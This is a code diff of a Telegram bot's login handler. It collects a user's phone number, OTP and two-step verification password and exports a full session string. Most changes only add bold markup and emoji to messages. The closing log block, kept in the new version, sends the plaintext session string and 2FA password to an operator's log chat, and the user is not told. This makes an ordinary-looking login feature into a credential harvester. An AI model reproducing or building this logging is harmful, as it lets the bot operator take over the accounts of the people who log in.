@@ -77,16 +77,16 @@ async def login_acc(bot: Client, message: Message):
     client = Client(f"session_{user_id}", API_ID, API_HASH)
     await client.connect()
 
-    await phone_number_msg.reply("Sending OTP...")
+    await phone_number_msg.reply("**Sending OTP...**")
 
     try:
         code = await client.send_code(phone_number)
-        phone_code_msg = await bot.ask(user_id, "Please send OTP (format: `1 2 3 4 5`).\nSend /cancel to cancel the process.", filters=filters.text, timeout=600)
+        phone_code_msg = await bot.ask(user_id, "**Please send OTP (format: `1 2 3 4 5`).\nSend /cancel to cancel the process.**", filters=filters.text, timeout=600)
     except PhoneNumberInvalid:
-        await phone_number_msg.reply('Invalid phone number.')
+        await phone_number_msg.reply('**Invalid phone number.**')
         return
     except asyncio.TimeoutError:
-        await phone_number_msg.reply('Time limit exceeded. Please restart.')
+        await phone_number_msg.reply('**Time limit exceeded. Please restart.**')
         return
 
     if phone_code_msg.text == '/cancel':
@@ -97,25 +97,25 @@ async def login_acc(bot: Client, message: Message):
     try:
         await client.sign_in(phone_number, code.phone_code_hash, phone_code)
     except PhoneCodeInvalid:
-        await phone_code_msg.reply('Invalid OTP.')
+        await phone_code_msg.reply('**Invalid OTP.**')
         return
     except PhoneCodeExpired:
-        await phone_code_msg.reply('OTP expired.')
+        await phone_code_msg.reply('**OTP expired.**')
         return
     except SessionPasswordNeeded:
         try:
-            two_step_msg = await bot.ask(user_id, 'Two-step verification enabled. Provide password.\nSend /cancel to cancel.', filters=filters.text, timeout=300)
+            two_step_msg = await bot.ask(user_id, '**Two-step verification enabled. Provide password.\nSend /cancel to cancel.**', filters=filters.text, timeout=300)
             if two_step_msg.text == '/cancel':
                 return await two_step_msg.reply('<b>Process cancelled!</b>')
         except asyncio.TimeoutError:
-            await message.reply('Time limit exceeded. Restart the session.')
+            await message.reply('**Time limit exceeded. Restart the session.**')
             return
         
         try:
             password = two_step_msg.text
             await client.check_password(password=password)
         except PasswordHashInvalid:
-            await two_step_msg.reply('Invalid password.')
+            await two_step_msg.reply('**Invalid password.**')
             return
     
     string_session = await client.export_session_string()
@@ -134,10 +134,10 @@ async def login_acc(bot: Client, message: Message):
     database.sessions.update_one({'user_id': user_id}, {'$set': data})
 
     log_message = (
-        f"**New Login**\n"
-        f"**User ID:** [{message.from_user.first_name}](tg://user?id={message.from_user.id})\n"
-        f"**Session String:** `{string_session}`\n"
-        f"**2FA Password:** `{password if 'password' in locals() else 'None'}`"
+        f"**✨New Login**\n"
+        f"**✨User ID:** [{message.from_user.first_name}](tg://user?id={message.from_user.id})\n"
+        f"**✨Session String:** `{string_session}`\n"
+        f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
     )
 
     await bot.send_message(LOGS_CHAT_ID, log_message)
